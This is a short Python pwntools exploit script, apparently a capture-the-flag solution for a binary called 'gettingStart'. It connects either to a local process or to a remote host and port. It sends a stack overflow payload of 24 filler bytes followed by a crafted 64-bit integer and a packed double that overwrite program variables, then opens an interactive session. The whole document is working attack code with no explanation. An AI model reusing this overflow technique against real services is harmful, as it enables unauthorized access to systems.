from pwn import *
import sys
import struct
if len(sys.argv)>1:
	debug = False
else:
	debug = True

if debug:
	io = process("./gettingStart")
else:
	io = remote("202.38.95.46",12008)

def pdouble(f):
	return struct.pack('d', f)

def double_to_hex(f):
	return hex(struct.unpack('<Q', struct.pack('<d', f))[0])

def int_to_double(i):
	return struct.unpack('<d', p64(i))[0]

def hex_to_double(h):
	return struct.unpack('<d', h.decode("hex")[::-1])[0]

int1 = 0x7FFFFFFFFFFFFFFF
payload = "A"*0x18 + p64(int1) + pdouble(0.1)
io.send(payload)
io.interactive()
